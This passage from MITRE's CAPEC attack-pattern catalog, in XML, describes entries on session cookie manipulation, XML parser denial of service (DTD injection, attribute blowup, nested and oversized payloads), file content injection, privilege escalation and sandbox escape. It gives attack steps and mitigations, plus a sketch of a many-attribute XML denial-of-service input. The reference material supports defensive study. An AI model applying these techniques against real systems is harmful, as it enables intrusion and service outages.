         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attacker_Skills_or_Knowledge_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="226" Name="Session Credential Falsification through Manipulation" Abstraction="Detailed" Status="Draft">
         <Description>An attacker manipulates an existing credential in order to gain access to a target application. Session credentials allow users to identify themselves to a service after an initial authentication without needing to resend the authentication information (usually a username and password) with every message. An attacker may be able to manipulate a credential sniffed from an existing connection in order to gain access to a target server. For example, a credential in the form of a web cookie might have a field that indicates the access rights of a user. By manually tweaking this cookie, a user might be able to increase their access rights to the server. Alternately an attacker may be able to manipulate an existing credential to appear as a different user. This attack differs from falsification through prediction in that the user bases their modified credentials off existing credentials instead of using patterns detected in prior credentials to create a new credential that is accepted because it fits the pattern. As a result, an attacker may be able to impersonate other users or elevate their permissions to a targeted service.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="196"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The targeted application must use session credentials to identify legitimate users.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>An attacker will need tools to sniff existing credentials (possibly their own) in order to retrieve a base credential for modification. They will need to understand how the components of the credential affect server behavior and how to manipulate this behavior by changing the credential. Finally, they will need tools to allow them to craft and transmit a modified credential.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="565"/>
            <Related_Weakness CWE_ID="472"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="227" Name="Sustained Client Engagement" Abstraction="Meta" Status="Draft">
         <Description>An adversary attempts to deny legitimate users access to a resource by continually engaging a specific resource in an attempt to keep the resource tied up as long as possible. The adversary's primary goal is not to crash or flood the target, which would alert defenders; rather it is to repeatedly perform actions or abuse algorithmic flaws such that a given resource is tied up and not available to a legitimate user. By carefully crafting a requests that keep the resource engaged through what is seemingly benign requests, legitimate users are limited or completely denied access to the resource. The degree to which the attack is successful depends upon the adversary's ability to sustain resource requests over time with a volume that exceeds the normal usage by legitimate users, as well as other mitigating circumstances such as the target's ability to shift load or acquire additional resources to deal with the depletion. This attack differs from a flooding attack as it is not entirely dependent upon large volumes of requests, and it differs from resource leak exposures which tend to exploit the surrounding environment needed for the resource to function. The key factor in a sustainment attack are the repeated requests that take longer to process than usual.</Description>
         <Prerequisites>
            <Prerequisite>This pattern of attack requires a temporal aspect to the servicing of a given request. Success can be achieved if the adversary can make requests that collectively take more time to complete than legitimate user requests within the same time frame.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>To successfully execute this pattern of attack, a script or program is often required that is capable of continually engaging the target and maintaining sustained usage of a specific resource. Depending on the configuration of the target, it may or may not be necessary to involve a network or cluster of objects all capable of making parallel requests.</Resource>
         </Resources_Required>
         <Mitigations>
            <Mitigation>Potential mitigations include requiring a unique login for each resource request, constraining local unprivileged access by disallowing simultaneous engagements of the resource, or limiting access to the resource to one access per IP address. In such scenarios, the adversary would have to increase engagements either by launching multiple sessions manually or programmatically to counter such defenses.</Mitigation>
         </Mitigations>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="228" Name="DTD Injection" Abstraction="Detailed" Status="Draft">
         <Description>An attacker injects malicious content into an application's DTD in an attempt to produce a negative technical impact. DTDs are used to describe how XML documents are processed. Certain malformed DTDs (for example, those with excessive entity expansion as described in CAPEC 197) can cause the XML parsers that process the DTDs to consume excessive resources resulting in resource depletion.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="250"/>
            <Related_Attack_Pattern Nature="CanFollow" CAPEC_ID="280"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Survey the target] Using a browser or an automated tool, an attacker records all instances of web services to process XML requests.</Description>
               <Technique>Use an automated tool to record all instances of URLs to process XML requests.</Technique>
               <Technique>Use a browser to manually explore the website and analyze how the application processes XML requests.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Explore</Phase>
               <Description>[Determine use of XML with DTDs] Examine application input to identify XML input that leverage the use of one or more DTDs.</Description>
               <Technique>Examine any available documentation for the application that discusses expected XML input.</Technique>
               <Technique>Exercise the application using XML input with and without a DTD specified. Failure without DTD likely indicates use of DTD.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Craft and inject XML containg malicious DTD payload]</Description>
               <Technique>Inject XML expansion attack that creates a Denial of Service impact on the targeted server using its DTD.</Technique>
               <Technique>Inject XML External Entity (XEE) attack that can cause the disclosure of confidential information, execute abitrary code, create a Denial of Service of the targeted server, or several other malicious impacts.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The target must be running an XML based application that leverages DTDs.</Prerequisite>
         </Prerequisites>
         <Mitigations>
            <Mitigation>Design: Sanitize incoming DTDs to prevent excessive expansion or other actions that could result in impacts like resource depletion.</Mitigation>
            <Mitigation>Implementation: Disallow the inclusion of DTDs as part of incoming messages.</Mitigation>
            <Mitigation>Implementation: Use XML parsing tools that protect against DTD attacks.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="829"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-86"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Description, Description Summary, Solutions_and_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="229" Name="XML Attribute Blowup" Abstraction="Detailed" Status="Draft">
         <Description>This attack exploits certain XML parsers which manage data in an inefficient manner. The attacker crafts an XML document with many attributes in the same XML node. In a vulnerable parser, this results in a denial of service condition owhere CPU resources are exhausted because of the parsing algorithm.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="231"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Survey the target] Using a browser or an automated tool, an attacker records all instances of web services to process XML requests.</Description>
               <Technique>Use an automated tool to record all instances of URLs to process XML requests.</Technique>
               <Technique>Use a browser to manually explore the website and analyze how the application processes XML requests.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Exploit</Phase>
               <Description>[Launch an XML Attribute Blowup attack] The attacker crafts malicious XML message that contains multiple Attributes in the same node.</Description>
               <Technique>Send the malicious crafted XML message containing the multiple attributes to the target URL, causing a denail of service.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The server accepts XML input and is using a parser with a runtime longer than O(n) for the insertion of a new attribute in the data container.(examples are .NET framework 1.0 and 1.1)</Prerequisite>
         </Prerequisites>
         <Mitigations>
            <Mitigation>This attack may be mitigated completely by using a parser that is not using a vulnerable container. Mitigation may also limit the number of attributes per XML element.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>In this example, assume that the victim is running a vulnerable parser such as .NET framework 1.0. This results in a quadratic runtime of O(n^2).</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">&lt;?xml version="1.0"?&gt;<xhtml:br/>&lt;foo<xhtml:br/>aaa=""<xhtml:br/>ZZZ=""<xhtml:br/>...<xhtml:br/>999=""<xhtml:br/>/&gt;</xhtml:div>
               <xhtml:p>A document with n attributes results in (n^2)/2 operations to be performed. If an operation takes 100 nanoseconds then a document with 100,000 operations would take 500s to process. In this fashion a small message of less than 1MB causes a denial of service condition on the CPU resources.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="770"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Attack_Phases, Description, Description Summary, Examples-Instances, Injection_Vector, Methods_of_Attack, Payload, Related_Attack_Patterns, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="23" Name="File Content Injection" Abstraction="Standard" Status="Draft">
         <Description>An attack of this type exploits the host's trust in executing remote content, including binary files. The files are poisoned with a malicious payload (targeting the file systems accessible by the target software) by the adversary and may be passed through standard channels such as via email, and standard web content like PDF and multimedia files. The adversary exploits known vulnerabilities or handling routines in the target processes. Vulnerabilities of this type have been found in a wide variety of commercial applications from Microsoft Office to Adobe Acrobat and Apple Safari web browser. When the adversary knows the standard handling routines and can identify vulnerabilities and entry points, they can be exploited by otherwise seemingly normal content. Once the attack is executed, the adversary's program can access relative directories such as C:\Program Files or other standard system directories to launch further attacks. In a worst case scenario, these programs are combined with other propagation logic and work as a virus.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="242"/>
            <Related_Attack_Pattern Nature="CanAlsoBe" CAPEC_ID="165"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The target software must consume files.</Prerequisite>
            <Prerequisite>The adversary must have access to modify files that the target software will consume.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">How to poison a file with malicious payload that will exploit a vulnerability when the file is opened. The adversary must also know how to place the file onto a system where it will be opened by an unsuspecting party, or force the file to be opened.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Enforce principle of least privilege</Mitigation>
            <Mitigation>Design: Validate all input for content including files. Ensure that if files and remote content must be accepted that once accepted, they are placed in a sandbox type location so that lower assurance clients cannot write up to higher assurance processes (like Web server processes for example)</Mitigation>
            <Mitigation>Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution.</Mitigation>
            <Mitigation>Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host.</Mitigation>
            <Mitigation>Implementation: Virus scanning on host</Mitigation>
            <Mitigation>Implementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>PHP is a very popular language used for developing web applications. When PHP is used with global variables, a vulnerability may be opened that affects the file system. A standard HTML form that allows for remote users to upload files, may also place those files in a public directory where the adversary can directly access and execute them through a browser. This vulnerability allows remote adversaries to execute arbitrary code on the system, and can result in the adversary being able to erase intrusion evidence from system and application logs.</xhtml:p>
               <xhtml:p>[R.23.2]</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="20"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
            <Reference External_Reference_ID="REF-88" Section="File System"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description Summary, Examples-Instances, Payload_Activation_Impact</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attacker_Skills_or_Knowledge_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-12-07">File System Function Injection, Content Based</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="230" Name="XML Nested Payloads" Abstraction="Standard" Status="Draft">
         <Description>Applications often need to transform data in and out of the XML format by using an XML parser. It may be possible for an attacker to inject data that may have an adverse effect on the XML parser when it is being processed. By nesting XML data and causing this data to be continuously self-referential, an attacker can cause the XML parser to consume more resources while processing, causing excessive memory consumption and CPU utilization. An attacker's goal is to leverage parser failure to his or her advantage. In most cases this type of an attack will result in a denial of service due to an application becoming unstable, freezing, or crash. However it may be possible to cause a crash resulting in arbitrary code execution, leading to a jump from the data plane to the control plane [R.230.1].</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="130"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>An attacker determines the input data stream that is being processed by an XML parser on the victim's side.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>An attacker crafts input data that may have an adverse effect on the operation of the XML parser when the data is parsed on the victim's system.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>An application uses an XML parser to perform transformation on user-controllable data.</Prerequisite>
            <Prerequisite>An application does not perform sufficient validation to ensure that user-controllable data is safe for an XML parser.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Denial of service</Skill>
            <Skill Level="High">Arbitrary code execution</Skill>
         </Skills_Required>
         <Indicators>
            <Indicator>Bad data is passed to the XML parser, possibly making it crash.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Resource Consumption</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Carefully validate and sanitize all user-controllable data prior to passing it to the XML parser routine. Ensure that the resultant data is safe to pass to the XML parser.</Mitigation>
            <Mitigation>Perform validation on canonical data.</Mitigation>
            <Mitigation>Pick a robust implementation of an XML parser.</Mitigation>
            <Mitigation>Validate XML against a valid schema or DTD prior to parsing.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="112"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="19"/>
            <Related_Weakness CWE_ID="674"/>
            <Related_Weakness CWE_ID="770"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-89" Section="What is an XML Parser Attack?"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="231" Name="XML Oversized Payloads" Abstraction="Standard" Status="Draft">
         <Description>Applications often need to transform data in and out of the XML format by using an XML parser. It may be possible for an attacker to inject data that may have an adverse effect on the XML parser when it is being processed. By supplying oversized payloads in input vectors that will be processed by the XML parser, an attacker can cause the XML parser to consume more resources while processing, causing excessive memory consumption and CPU utilization, and potentially cause execution of arbitrary code. An attacker's goal is to leverage parser failure to his or her advantage. In many cases this type of an attack will result in a denial of service due to an application becoming unstable, freezing, or crash. However it is possible to cause a crash resulting in arbitrary code execution, leading to a jump from the data plane to the control plane [R.231.1].</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="130"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>An attacker determines the input data stream that is being processed by an XML parser on the victim's side.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>An attacker crafts input data that may have an adverse effect on the operation of the XML parser when the data is parsed on the victim's system.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>An application uses an XML parser to perform transformation on user-controllable data.</Prerequisite>
            <Prerequisite>An application does not perform sufficient validation to ensure that user-controllable data is safe for an XML parser.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Denial of service</Skill>
            <Skill Level="High">Arbitrary code execution</Skill>
         </Skills_Required>
         <Indicators>
            <Indicator>Bad data is passed to the XML parser (possibly repeatedly), possibly making it crash or execute arbitrary code.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Resource Consumption</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Carefully validate and sanitize all user-controllable data prior to passing it to the XML parser routine. Ensure that the resultant data is safe to pass to the XML parser.</Mitigation>
            <Mitigation>Perform validation on canonical data.</Mitigation>
            <Mitigation>Pick a robust implementation of an XML parser.</Mitigation>
            <Mitigation>Validate XML against a valid schema or DTD prior to parsing.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="112"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="19"/>
            <Related_Weakness CWE_ID="674"/>
            <Related_Weakness CWE_ID="770"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-89" Section="What is an XML Parser Attack?"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="233" Name="Privilege Escalation" Abstraction="Meta" Status="Draft">
         <Description>An adversary exploits a weakness enabling them to elevate their privilege and perform an action that they are not supposed to be authorized to perform.</Description>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="269"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Description, Description Summary, Relationships, Type (Category -&gt; Attack_Pattern)</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="234" Name="Hijacking a privileged process" Abstraction="Standard" Status="Draft">
         <Description>An attacker gains control of a process that is assigned elevated privileges in order to execute arbitrary code with those privileges. Some processes are assigned elevated privileges on an operating system, usually through association with a particular user, group, or role. If an attacker can hijack this process, they will be able to assume its level of privilege in order to execute their own code. Processes can be hijacked through improper handling of user input (for example, a buffer overflow or certain types of injection attacks) or by utilizing system utilities that support process control that have been inadequately secured.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="233"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The targeted process or operating system must contain a bug that allows attackers to hijack the targeted process.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="732"/>
            <Related_Weakness CWE_ID="648"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="236" Name="Catching exception throw/signal from privileged block" Abstraction="Detailed" Status="Draft">
         <Description>Attackers can sometimes hijack a privileged thread from the underlying system through synchronous (calling a privileged function that returns incorrectly) or asynchronous (callbacks, signal handlers, and similar) means. Having done so, the Attacker may not only likely access functionality the system's designer didn't intend for them, but they may also go undetected or deny other users essential service in a catastrophic (or insidiously subtle) way.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="30"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>Attacker determines the underlying system thread that is subject to user-control</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>Attacker then provides input, perhaps by way of environment variables for the process in question, that affect the executing thread</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>Upon successful hijacking, the attacker enjoys elevated privileges, and can possibly have the hijacked thread do his bidding</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The application in question employs a threaded model of execution with the threads operating at, or having the ability to switch to, a higher privilege level than normal users</Prerequisite>
            <Prerequisite>In order to feasibly execute this class of attacks, the attacker must have the ability to hijack a privileged thread.</Prerequisite>
            <Prerequisite>This ability includes, but is not limited to, modifying environment variables that affect the process the thread belongs to, or providing malformed user-controllable input that causes the executing thread to fault and return to a higher privilege level or such.</Prerequisite>
            <Prerequisite>This does not preclude network-based attacks, but makes them conceptually more difficult to identify and execute.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Hijacking a thread involves knowledge of how processes and threads function on the target platform, the design of the target application as well as the ability to identify the primitives to be used or manipulated to hijack the thread.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>
               <xhtml:p>None: No specialized resources are required to execute this type of attack. The attacker needs to be able to latch onto a privileged thread.</xhtml:p>
               <xhtml:p>The Attacker does, however, need to be able to program, compile, and link to the victim binaries being executed so that it will turn control of a privileged thread over to the Attacker's malicious code. This is the case even if the attacker conducts the attack remotely.</xhtml:p>
            </Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Application Architects must be careful to design callback, signal, and similar asynchronous constructs such that they shed excess privilege prior to handing control to user-written (thus untrusted) code.</Mitigation>
            <Mitigation>Application Architects must be careful to design privileged code blocks such that upon return (successful, failed, or unpredicted) that privilege is shed prior to leaving the block/scope.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Attacker targets an application written using Java's AWT, with the 1.2.2 era event model. In this circumstance, any AWTEvent originating in the underlying OS (such as a mouse click) would return a privileged thread. The Attacker could choose to not return the AWT-generated thread upon consuming the event, but instead leveraging its privilege to conduct privileged operations.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="270"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="237" Name="Escaping a Sandbox by Calling Signed Code in Another Language" Abstraction="Detailed" Status="Draft">
         <Description>The attacker may submit a malicious signed code from another language to obtain access to privileges that were not intentionally exposed by the sandbox, thus escaping the sandbox. For instance, Java code cannot perform unsafe operations, such as modifying arbitrary memory locations, due to restrictions placed on it by the Byte code Verifier and the JVM. If allowed, Java code can call directly into native C code, which may perform unsafe operations, such as call system calls and modify arbitrary memory locations on their behalf. To provide isolation, Java does not grant untrusted code with unmediated access to native C code. Instead, the sandboxed code is typically allowed to call some subset of the pre-existing native code that is part of standard libraries.</Description>
